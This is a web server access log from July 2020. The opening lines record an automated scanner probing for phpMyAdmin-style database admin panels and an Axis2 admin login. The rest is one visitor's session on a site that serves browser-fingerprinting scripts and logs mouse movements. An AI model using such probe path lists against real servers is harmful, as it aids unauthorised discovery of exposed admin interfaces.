- - [08/Jul/2020:06:54:35 +0000] "GET /mysql/dbadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:43 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:44 +0000] "GET /sqladmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:51 +0000] "GET /sql/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:51 +0000] "GET /SQL/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:52 +0000] "GET /websql/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:53 +0000] "GET /MySQLAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:55 +0000] "POST /axis2/axis2-admin/login HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
- - [08/Jul/2020:07:28:59 +0000] "GET / HTTP/1.1" 200 1251 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:01 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:02 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:03 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:04 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:05 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:07 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:08 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:09 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:09 +0000] "GET /index.php HTTP/1.1" 200 1250 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:29:10 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/index.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:46 +0000] "GET / HTTP/1.1" 200 1251 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:51 +0000] "GET /content/big_data.php HTTP/1.1" 200 3771 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:56 +0000] "GET /index.php HTTP/1.1" 200 1250 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/index.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:31:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/index.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:24 +0000] "GET / HTTP/1.1" 200 1251 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:25 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:26 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:27 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:28 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:28 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:31 +0000] "GET /index.php HTTP/1.1" 200 1250 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/index.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/index.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:32:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/index.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:30 +0000] "GET / HTTP/1.1" 200 1251 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:52 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:34:59 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:00 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:01 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:02 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:03 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:05 +0000] "GET / HTTP/1.1" 200 1250 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:05 +0000] "GET /css/main.css HTTP/1.1" 200 738 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:05 +0000] "GET /js/initialise_vars.js HTTP/1.1" 200 598 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:05 +0000] "GET /js/cookies_functions.js HTTP/1.1" 200 835 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:05 +0000] "GET /js/fingerprint_browser.js HTTP/1.1" 200 1048 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:05 +0000] "GET /js/mousemove_onclick.js HTTP/1.1" 200 398 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:05 +0000] "GET /js/mousemove_ontimeout.js HTTP/1.1" 200 1262 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:07 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:42 +0000] "GET / HTTP/1.1" 200 1251 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:42 +0000] "GET /css/main.css HTTP/1.1" 200 739 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:42 +0000] "GET /js/initialise_vars.js HTTP/1.1" 200 599 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:42 +0000] "GET /js/cookies_functions.js HTTP/1.1" 200 834 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:42 +0000] "GET /js/fingerprint_browser.js HTTP/1.1" 200 1047 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:42 +0000] "GET /js/mousemove_onclick.js HTTP/1.1" 304 163 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:42 +0000] "GET /js/mousemove_ontimeout.js HTTP/1.1" 200 1262 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
- - [08/Jul/2020:07:35:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
